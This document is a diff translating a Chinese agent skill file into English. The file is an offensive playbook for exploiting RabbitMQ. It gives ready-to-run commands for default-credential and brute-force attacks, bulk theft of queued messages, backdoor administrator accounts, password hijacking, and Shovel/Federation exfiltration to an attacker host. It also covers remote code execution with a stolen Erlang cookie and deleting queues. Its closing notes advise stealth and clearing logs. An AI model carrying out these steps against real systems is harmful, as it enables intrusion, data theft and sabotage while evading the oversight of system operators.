@@ -1,138 +1,143 @@
 ---
 name: rabbitmq-tactics
-description: "RabbitMQ 未授权访问与利用。当发现目标开放 5672/15672 端口、RabbitMQ Management API 暴露、默认凭据 guest/guest 未修改、或需要从 RabbitMQ 窃取消息数据时使用。覆盖默认凭据攻击、Management API 枚举、队列消息批量导出、Exchange 滥用、用户创建与密码修改、VHost 操控、Shovel/Federation 数据外传、集群信息窃取、Erlang Cookie RCE、消息篡改"
+description: "RabbitMQ unauthorized access and exploitation. Use when a target exposes ports 5672/15672, the RabbitMQ Management API is reachable, default guest/guest credentials are unchanged, or you need to steal message data from RabbitMQ. Covers default credential attacks, Management API enumeration, bulk queue message export, Exchange abuse, user creation and password change, VHost manipulation, Shovel/Federation data exfiltration, cluster information theft, Erlang Cookie RCE, and message tampering"
+zh-signals: "RabbitMQ 未授权访问与利用，覆盖默认凭据、Management API 枚举、消息导出与 Erlang Cookie RCE。信号:RabbitMQ,5672端口,Management API,消息队列,Erlang Cookie"
+when-to-use: >-
+  Use when a target exposes RabbitMQ ports 5672/15672 or the Management API,
+  especially with default guest/guest credentials, and you need to enumerate, extract
+  messages, or assess RCE paths under authorization.
 metadata:
-  tags: "rabbitmq,5672,15672,amqp,management-api,guest,erlang-cookie,shovel,federation,vhost,消息队列"
+  tags: "rabbitmq,5672,15672,amqp,management-api,guest,erlang-cookie,shovel,federation,vhost,message-queue"
   category: "postexploit"
 ---
 
-# RabbitMQ 未授权访问与利用
+# RabbitMQ Unauthorized Access and Exploitation
 
-RabbitMQ 默认开启 Management Plugin 并使用 guest/guest 凭据（仅限 localhost），但大量实例因配置 `loopback_users = none` 导致 guest 账户可远程登录——从消息窃取到 Erlang Cookie RCE 只需几步。
+RabbitMQ enables the Management Plugin by default and ships with guest/guest credentials (localhost only), but many instances set `loopback_users = none`, which makes the guest account remotely accessible — going from message theft to Erlang Cookie RCE takes only a few steps.
 
-## 深入参考（必读）
-- 完整利用命令和 payload → 读 [references/attack-techniques.md](references/attack-techniques.md)
+## Further Reading (Must Read)
+- Full exploitation commands and payloads → read [references/attack-techniques.md](references/attack-techniques.md)
 
 ---
 
-## Phase 1: 服务发现与端口识别
+## Phase 1: Service Discovery and Port Identification
 
-### 1.1 端口扫描
+### 1.1 Port Scanning
 
 ```bash
-# 常用端口：5672(AMQP), 15672(Management UI), 4369(epmd), 25672(集群通信)
+# Common ports: 5672(AMQP), 15672(Management UI), 4369(epmd), 25672(cluster communication)
 nmap -sV -p 5672,15672,4369,25672 TARGET
 
-# AMQP 服务探测
+# AMQP service probe
 nmap -sV -p 5672 --script amqp-info TARGET
 ```
 
-### 1.2 Management UI 探测
+### 1.2 Management UI Probe
 
 ```bash
-# 检查 Management API 是否可达
+# Check whether the Management API is reachable
 curl -s -o /dev/null -w "%{http_code}" http://TARGET:15672/api/overview
 
-# HTTPS 变体
+# HTTPS variant
 curl -sk -o /dev/null -w "%{http_code}" https://TARGET:15672/api/overview
 ```
 
-**关键判断**：
-- 返回 401 → Management API 可达，需要凭据，进入 Phase 2
-- 返回 200 → 已有有效认证或无需认证（罕见），直接进入 Phase 3
-- 连接失败 → Management Plugin 未启用，尝试 5672 AMQP 直连
-- 4369 开放 → epmd 暴露，可枚举 Erlang 节点名
+**Key Decision**:
+- Returns 401 → Management API is reachable, credentials are required, go to Phase 2
+- Returns 200 → Valid authentication already exists or no authentication is needed (rare), go straight to Phase 3
+- Connection fails → Management Plugin is not enabled, try connecting directly to 5672 AMQP
+- 4369 is open → epmd is exposed and Erlang node names can be enumerated
 
 ---
 
-## Phase 2: 默认凭据与弱口令检测
+## Phase 2: Default Credentials and Weak Password Detection
 
-### 2.1 默认凭据
+### 2.1 Default Credentials
 
 ```bash
-# guest/guest（最常见，默认仅限 localhost，但常被配置为允许远程）
+# guest/guest (most common, localhost-only by default but often configured for remote access)
 curl -s -u guest:guest http://TARGET:15672/api/overview | jq '.rabbitmq_version'
 
 # admin/admin
 curl -s -u admin:admin http://TARGET:15672/api/overview | jq '.rabbitmq_version'
 
-# 批量测试常见凭据
+# Batch test common credentials
 for creds in "guest:guest" "admin:admin" "admin:password" "admin:123456" "rabbitmq:rabbitmq"; do
   code=$(curl -s -o /dev/null -w "%{http_code}" -u "$creds" http://TARGET:15672/api/overview)
   echo "$creds -> $code"
 done
 ```
 
-### 2.2 暴力破解
+### 2.2 Brute Force
 
 ```bash
-# Hydra 针对 HTTP Basic Auth
+# Hydra against HTTP Basic Auth
 hydra -L users.txt -P passwords.txt TARGET http-get /api/overview -s 15672
 
-# Nmap HTTP 爆破
+# Nmap HTTP brute force
 nmap -p 15672 --script http-brute --script-args http-brute.path=/api/overview TARGET
 ```
 
-**关键判断**：
-- 返回 200 + JSON 数据 → 凭据有效，进入 Phase 3
-- 全部 401 → 无弱口令，尝试 AMQP 5672 端口直连或寻找其他入口
+**Key Decision**:
+- Returns 200 + JSON data → credentials are valid, go to Phase 3
+- All 401 → no weak credentials, try connecting directly to AMQP on port 5672 or look for another entry point
 
 ---
 
-## Phase 3: 攻击决策树
+## Phase 3: Attack Decision Tree
 
 ```
-凭据有效？
-├─ Management API 可用 (15672)
-│   ├─ 用户具备 administrator tag
-│   │   ├─ 枚举队列/Exchange/VHost → 消息批量导出 (Phase 4.1)
-│   │   ├─ 创建后门用户 → 持久化访问 (Phase 4.2)
-│   │   ├─ 配置 Shovel/Federation → 数据外传到攻击机 (Phase 4.3)
-│   │   └─ 读取集群/节点信息 → 横向移动 (Phase 4.4)
-│   └─ 用户为普通权限
-│       ├─ 读取可访问队列消息
-│       └─ 枚举 Exchange 绑定关系
-├─ 可访问文件系统
-│   ├─ 读取 Erlang Cookie → RCE (Phase 5)
-│   └─ 读取 rabbitmq.conf → 获取更多凭据
-└─ 仅 AMQP 5672 可达
-    ├─ 用 amqp 客户端连接枚举
-    └─ 监听消息消费
+Credentials valid?
+├─ Management API available (15672)
+│   ├─ User has the administrator tag
+│   │   ├─ Enumerate queues/Exchanges/VHosts → bulk message export (Phase 4.1)
+│   │   ├─ Create a backdoor user → persistent access (Phase 4.2)
+│   │   ├─ Configure Shovel/Federation → exfiltrate data to the attacker machine (Phase 4.3)
+│   │   └─ Read cluster/node information → lateral movement (Phase 4.4)
+│   └─ User has regular privileges
+│       ├─ Read messages from accessible queues
+│       └─ Enumerate Exchange bindings
+├─ Filesystem is accessible
+│   ├─ Read the Erlang Cookie → RCE (Phase 5)
+│   └─ Read rabbitmq.conf → obtain more credentials
+└─ Only AMQP 5672 is reachable
+    ├─ Enumerate by connecting with an amqp client
+    └─ Listen on message consumption
 ```
 
-**前置信息收集**：
+**Preliminary Information Gathering**:
 
 ```bash
-# 获取 RabbitMQ 版本与集群名
+# Get the RabbitMQ version and cluster name
 curl -s -u USER:PASS http://TARGET:15672/api/overview | jq '{rabbitmq_version, cluster_name, erlang_version}'
 
-# 列出所有用户及其 tag（判断权限等级）
+# List all users and their tags (to determine privilege level)
 curl -s -u USER:PASS http://TARGET:15672/api/users | jq '.[] | {name, tags}'
 
-# 列出所有 VHost
+# List all VHosts
 curl -s -u USER:PASS http://TARGET:15672/api/vhosts | jq '.[].name'
 
-# 列出当前用户权限
+# List the current user's permissions
 curl -s -u USER:PASS http://TARGET:15672/api/permissions | jq '.'
 ```
 
 ---
 
-## Phase 4: Management API 利用速查
+## Phase 4: Management API Exploitation Quick Reference
 
-### 4.1 队列枚举与消息批量导出
+### 4.1 Queue Enumeration and Bulk Message Export
 
 ```bash
-# 列出所有队列（关注 messages 字段，非零表示有待消费消息）
+# List all queues (watch the messages field, a non-zero value means pending messages)
 curl -s -u USER:PASS http://TARGET:15672/api/queues | jq '.[] | {vhost, name, messages}'
 
-# 从指定队列获取消息（requeue: true 不删除原消息）
+# Fetch messages from a specific queue (requeue: true does not delete the original messages)
 curl -s -u USER:PASS \
   "http://TARGET:15672/api/queues/%2F/QUEUE_NAME/get" \
   -H "content-type: application/json" \
   -d '{"count": 100, "requeue": true, "encoding": "auto"}'
 
-# 批量导出所有队列消息
+# Bulk export messages from all queues
 for queue in $(curl -s -u USER:PASS http://TARGET:15672/api/queues | jq -r '.[].name'); do
   echo "=== Queue: $queue ==="
   curl -s -u USER:PASS \
@@ -142,32 +147,32 @@ for queue in $(curl -s -u USER:PASS http://TARGET:15672/api/queues | jq -r '.[].
 done > rabbitmq_messages_dump.json
 ```
 
-### 4.2 用户创建与权限操控
+### 4.2 User Creation and Permission Manipulation
 
 ```bash
-# 创建 administrator 用户
+# Create an administrator user
 curl -u USER:PASS -X PUT \
   http://TARGET:15672/api/users/backdoor \
   -H "content-type: application/json" \
   -d '{"password": "P@ssw0rd!", "tags": "administrator"}'
 
-# 授予全部权限（对 / VHost）
+# Grant full permissions (on the / VHost)
 curl -u USER:PASS -X PUT \
   "http://TARGET:15672/api/permissions/%2F/backdoor" \
   -H "content-type: application/json" \
   -d '{"configure": ".*", "write": ".*", "read": ".*"}'
 
-# 修改已有用户密码
+# Change the password of an existing user
 curl -u USER:PASS -X PUT \
   http://TARGET:15672/api/users/admin \
   -H "content-type: application/json" \
   -d '{"password": "newP@ss", "tags": "administrator"}'
 ```
 
-### 4.3 Shovel/Federation 数据外传
+### 4.3 Shovel/Federation Data Exfiltration
 
 ```bash
-# 创建 Shovel：将目标队列消息实时转发到攻击机
+# Create a Shovel: forward target queue messages to the attacker machine in real time
 curl -u USER:PASS -X PUT \
   "http://TARGET:15672/api/parameters/shovel/%2F/exfil-shovel" \
   -H "content-type: application/json" \
@@ -180,7 +185,7 @@ curl -u USER:PASS -X PUT \
     }
   }'
 
-# 创建 Federation Upstream：镜像目标 Exchange
+# Create a Federation Upstream: mirror the target Exchange
 curl -u USER:PASS -X PUT \
   "http://TARGET:15672/api/parameters/federation-upstream/%2F/attacker-upstream" \
   -H "content-type: application/json" \
@@ -192,131 +197,131 @@ curl -u USER:PASS -X PUT \
   }'
 ```
 
-### 4.4 集群与节点信息
+### 4.4 Cluster and Node Information
 
 ```bash
-# 节点列表（获取主机名、Erlang 版本、内存使用）
+# Node list (hostname, Erlang version, memory usage)
 curl -s -u USER:PASS http://TARGET:15672/api/nodes | jq '.[] | {name, erlang_version, mem_used}'
 
-# 当前连接（获取客户端 IP、用户名）
+# Current connections (client IP, username)
 curl -s -u USER:PASS http://TARGET:15672/api/connections | jq '.[] | {peer_host, peer_port, user}'
 
-# 通道信息
+# Channel information
 curl -s -u USER:PASS http://TARGET:15672/api/channels | jq '.[] | {connection_details, user}'
 ```
 
-→ 完整 API 端点与 payload → 读 [references/attack-techniques.md](references/attack-techniques.md)
+→ Full API endpoints and payloads → read [references/attack-techniques.md](references/attack-techniques.md)
 
 ---
 
-## Phase 5: Erlang Cookie RCE 速查
+## Phase 5: Erlang Cookie RCE Quick Reference
 
-### 5.1 获取 Erlang Cookie
+### 5.1 Obtaining the Erlang Cookie
 
 ```bash
-# 常见路径
+# Common paths
 cat /var/lib/rabbitmq/.erlang.cookie
 cat /home/rabbitmq/.erlang.cookie
 cat ~/.erlang.cookie
 
-# 环境变量
+# Environment variables
 env | grep -i erlang
 ```
 
-### 5.2 利用 Cookie 执行命令
+### 5.2 Command Execution via the Cookie
 
 ```bash
-# 使用窃取的 Cookie 连接到目标节点
-# 获取节点名（从 Management API 或 epmd）
-epmd -names  # 在 4369 端口查询
+# Connect to the target node with the stolen cookie
+# Obtain the node name (from the Management API or epmd)
+epmd -names  # query on port 4369
 
-# 通过 Erlang 远程调用执行命令
+# Execute commands through the Erlang remote shell
 erl -sname attacker -setcookie STOLEN_COOKIE -remsh rabbit@TARGET_HOSTNAME
 
-# 在 Erlang shell 中执行系统命令
+# Execute system commands in the Erlang shell
 > os:cmd("id").
 > os:cmd("cat /etc/passwd").
 > os:cmd("whoami").
 
-# 或通过 rabbitmqctl 远程管理
+# Or manage remotely through rabbitmqctl
 RABBITMQ_ERLANG_COOKIE=STOLEN_COOKIE rabbitmqctl -n rabbit@TARGET_HOSTNAME cluster_status
 RABBITMQ_ERLANG_COOKIE=STOLEN_COOKIE rabbitmqctl -n rabbit@TARGET_HOSTNAME eval 'os:cmd("id").'
 ```
 
-**关键判断**：
-- Erlang Cookie 一致 → 可获得 RCE，权限等同于 RabbitMQ 进程用户
-- Cookie 不匹配 → `PROTOCOL_ERROR` / 连接拒绝，无法利用
+**Key Decision**:
+- Erlang Cookie matches → RCE is possible, with privileges equivalent to the RabbitMQ process user
+- Cookie does not match → `PROTOCOL_ERROR` / connection refused, exploitation is not possible
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整 Erlang 利用细节
+→ Read [references/attack-techniques.md](references/attack-techniques.md) for complete Erlang exploitation details
 
 ---
 
-## Phase 6: Exchange 滥用与消息篡改
+## Phase 6: Exchange Abuse and Message Tampering
 
-### 6.1 Exchange 枚举
+### 6.1 Exchange Enumeration
 
 ```bash
-# 列出所有 Exchange
+# List all Exchanges
 curl -s -u USER:PASS http://TARGET:15672/api/exchanges | jq '.[] | {vhost, name, type}'
 
-# 查看 Exchange 绑定关系
+# Inspect Exchange bindings
 curl -s -u USER:PASS \
   "http://TARGET:15672/api/exchanges/%2F/EXCHANGE_NAME/bindings/source" | jq '.'
 ```
 
-### 6.2 消息注入
+### 6.2 Message Injection
 
 ```bash
-# 向 Exchange 发布消息（可干扰业务逻辑）
+# Publish a message to an Exchange (can interfere with business logic)
 curl -u USER:PASS \
   "http://TARGET:15672/api/exchanges/%2F/EXCHANGE_NAME/publish" \
   -H "content-type: application/json" \
   -d '{"routing_key": "target.key", "payload": "injected_data", "payload_encoding": "string", "properties": {}}'
 ```
 
-### 6.3 消息篡改与删除
+### 6.3 Message Tampering and Deletion
 
 ```bash
-# 消费消息（不重新入队 = 删除）
+# Consume a message (not requeued = deleted)
 curl -s -u USER:PASS \
   "http://TARGET:15672/api/queues/%2F/QUEUE_NAME/get" \
   -H "content-type: application/json" \
   -d '{"count": 1, "requeue": false, "encoding": "auto"}'
 
-# 清空队列
+# Purge the queue
 curl -X DELETE -u USER:PASS \
   "http://TARGET:15672/api/queues/%2F/QUEUE_NAME/contents"
 
-# 删除整个队列
+# Delete the entire queue
 curl -X DELETE -u USER:PASS \
   "http://TARGET:15672/api/queues/%2F/QUEUE_NAME"
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取消息篡改完整流程
+→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete message tampering workflow
 
 ---
 
-## 工具速查
+## Tool Quick Reference
 
-| 工具 | 用途 |
+| Tool | Purpose |
 |------|------|
-| curl + Management API | 所有 HTTP API 操作的基础 |
-| rabbitmqadmin | RabbitMQ 官方 CLI 管理工具 |
-| amqp-tools (amqp-publish/amqp-consume) | AMQP 协议直连收发消息 |
-| pika (Python) | Python AMQP 客户端，编写自动化脚本 |
-| hydra | HTTP Basic Auth 爆破 |
-| nmap amqp-info | AMQP 服务信息收集 |
-| epmd | Erlang 端口映射，枚举节点名 |
-| erl | Erlang shell，配合 Cookie 实现 RCE |
+| curl + Management API | The basis for all HTTP API operations |
+| rabbitmqadmin | Official RabbitMQ CLI management tool |
+| amqp-tools (amqp-publish/amqp-consume) | Direct AMQP protocol send/receive |
+| pika (Python) | Python AMQP client for writing automation scripts |
+| hydra | HTTP Basic Auth brute forcing |
+| nmap amqp-info | AMQP service information gathering |
+| epmd | Erlang port mapper, enumerates node names |
+| erl | Erlang shell, RCE with the Cookie |
 
 ---
 
-## 注意事项
+## Notes
 
-- `guest/guest` 默认仅允许 localhost 连接，远程可用说明已配置 `loopback_users = none`
-- 消息获取时 `requeue: false` 会永久消费消息，生产环境慎用（推荐 `requeue: true`）
-- Shovel/Federation 配置后消息实时转发，流量可能被网络监控捕获
-- Erlang Cookie 通常为固定字符串，集群内所有节点共享同一 Cookie
-- `%2F` 是 URL 编码的 `/`，代表默认 VHost，API 调用中必须使用编码形式
-- 创建后门用户和 Shovel 会在 Management UI 中可见，注意隐蔽性
-- rabbitmqctl 操作记录在 RabbitMQ 日志中，注意清理痕迹
+- `guest/guest` only allows localhost connections by default; remote access means `loopback_users = none` is configured
+- Using `requeue: false` when fetching messages consumes them permanently, use it with care in production (`requeue: true` is recommended)
+- After configuring Shovel/Federation messages are forwarded in real time and the traffic may be captured by network monitoring
+- The Erlang Cookie is usually a fixed string, and all nodes in a cluster share the same cookie
+- `%2F` is the URL-encoded form of `/`, representing the default VHost, and API calls must use the encoded form
+- Backdoor users and Shovels are visible in the Management UI, watch out for stealth
+- rabbitmqctl operations are logged in the RabbitMQ logs, remember to clean up traces
